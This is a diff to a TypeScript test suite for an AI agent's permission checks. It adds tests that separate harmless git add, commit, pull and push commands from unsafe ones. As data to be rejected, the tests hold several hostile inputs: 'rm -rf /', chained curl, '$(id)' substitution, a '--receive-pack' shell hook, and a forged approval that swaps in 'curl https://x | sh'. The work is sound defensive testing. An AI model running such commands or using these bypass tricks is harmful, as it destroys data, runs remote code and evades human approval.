@@ -262,7 +262,7 @@ for (const key of [
 }
 
 const { FLEET_TRAILER } = await import("./gitHooks.js");
-const { runSession, sumModelUsage, formatAnswerTurn, ANSWER_NO_REASK, SIDECAR_MCP_TIMEOUT_MS, matchesToolRule, definitionDecision } = await import("./session.js");
+const { runSession, sumModelUsage, formatAnswerTurn, ANSWER_NO_REASK, SIDECAR_MCP_TIMEOUT_MS, matchesToolRule, definitionDecision, gitArgsAreInert } = await import("./session.js");
 
 beforeEach(() => {
   pushedMessages.length = 0;
@@ -1541,12 +1541,12 @@ test.each([
 test.each([
   ["Read", {}, "", "allow"],
   ["Bash", { command: "git status" }, "", "allow"],
-  ["Bash", { command: "git add -A" }, "", "ask"],
+  ["Bash", { command: "git add --chmod=+x a" }, "", "ask"],
   ["Bash", { command: "curl https://x" }, "", "deny"],
   ["Write", { file_path: "a" }, "", "deny"],
   ["mcp__playwright__browser_navigate", {}, "", "deny"],
   ["ExitPlanMode", {}, "", "ask"],
-  ["Bash", { command: "git add -A" }, "deny", "deny"],
+  ["Bash", { command: "git add --chmod=+x a" }, "deny", "deny"],
   ["ExitPlanMode", {}, "deny", "deny"],
   ["Read", {}, "deny", "allow"],
 ] as const)("definitionDecision(%s, %j, interaction=%s) = %s", (tool, input, interaction, want) => {
@@ -1554,9 +1554,44 @@ test.each([
   expect(d.behavior).toBe(want);
 });
 
+test.each([
+  // The everyday edit-and-sync loop runs without a prompt.
+  ["git add", "git add .", true],
+  ["git add", "git add -A", true],
+  ["git add", "git add 'notes/a b.md'", true],
+  ["git commit", 'git commit -m "fix: tidy the index page"', true],
+  ["git commit", "git commit -am 'x'", false],
+  ["git commit", "git commit -m 'it costs $5'", true],
+  ["git pull --rebase", "git pull --rebase", true],
+  ["git pull --rebase", "git pull --rebase origin main", true],
+  ["git push", "git push", true],
+  ["git push", "git push origin main", true],
+  ["git push", "git push -u origin main", true],
+  // Anything that can run a local command, rewrite history or chain asks.
+  ["git push", "git push --receive-pack='sh -c x' origin", false],
+  ["git push", "git push --force", false],
+  ["git push", "git push -f origin main", false],
+  ["git push", "git push origin +main", false],
+  ["git push", "git push origin :main", false],
+  ["git push", "git push origin main:other", false],
+  ["git pull --rebase", "git pull --rebase --upload-pack=x", false],
+  ["git commit", "git commit --no-verify -m x", false],
+  ["git commit", 'git commit -m "$(id)"', false],
+  ["git commit", "git commit -m", false],
+  ["git add", "git add . && curl x", false],
+  ["git add", "git add . ; rm -rf /", false],
+  ["git add", "git add `id`", false],
+  ["git add", "git add 'unterminated", false],
+  ["git add", "git addx", false],
+  ["git diff", "git diff --output=/tmp/x", false],
+  ["git rebase", "git rebase -i", false],
+] as const)("gitArgsAreInert(%s, %s) = %s", (prefix, command, want) => {
+  expect(gitArgsAreInert(prefix, command)).toBe(want);
+});
+
 test("definitionDecision says why it denied", () => {
   expect(definitionDecision(DEF_SPEC, "Write", {})).toEqual({ behavior: "deny", message: "not in this definition's tools.allow" });
-  expect(definitionDecision({ ...DEF_SPEC, interaction: "deny" }, "Bash", { command: "git add ." })).toEqual({
+  expect(definitionDecision({ ...DEF_SPEC, interaction: "deny" }, "Bash", { command: "git add --chmod=+x a" })).toEqual({
     behavior: "deny",
     message: "not allowed in a headless run",
   });
@@ -1613,7 +1648,7 @@ test("definition session: canUseTool allows inside tools.allow, asks on a Bash p
   expect(pushedMessages.filter((m) => m.type === "permission_request")).toHaveLength(0);
 
   let resolved: { behavior: string } | null = null;
-  const call = capturedCanUseTool!("Bash", { command: "git add ." }).then((r) => (resolved = r));
+  const call = capturedCanUseTool!("Bash", { command: "git add --chmod=+x a" }).then((r) => (resolved = r));
   await Bun.sleep(20);
   expect(resolved).toBeNull();
   expect(findPermissionRequest("Bash")).toBeDefined();
@@ -1629,7 +1664,7 @@ test("definition session: a permission-mode change approves nothing", async () =
   await Bun.sleep(20);
 
   let resolved: { behavior: string } | null = null;
-  const call = capturedCanUseTool!("Bash", { command: "git add ." }).then((r) => (resolved = r));
+  const call = capturedCanUseTool!("Bash", { command: "git add --chmod=+x a" }).then((r) => (resolved = r));
   await Bun.sleep(20);
   pushHuman("plan", "permission_mode");
   await Bun.sleep(20);
@@ -1647,12 +1682,12 @@ test("definition session: an answer's updatedInput is ignored, the call runs as 
   const promise = runSession();
   await Bun.sleep(20);
 
-  const call = capturedCanUseTool!("Bash", { command: "git add ." });
+  const call = capturedCanUseTool!("Bash", { command: "git add --chmod=+x a" });
   await Bun.sleep(20);
   const req = findPermissionRequest("Bash");
   respondToPermission(req!.seq, { behavior: "allow", updatedInput: { command: "curl https://x | sh" } });
   const result = await call;
-  expect(result).toEqual({ behavior: "allow", updatedInput: { command: "git add ." } });
+  expect(result).toEqual({ behavior: "allow", updatedInput: { command: "git add --chmod=+x a" } });
 
   pushHuman("", "abort");
   await promise;
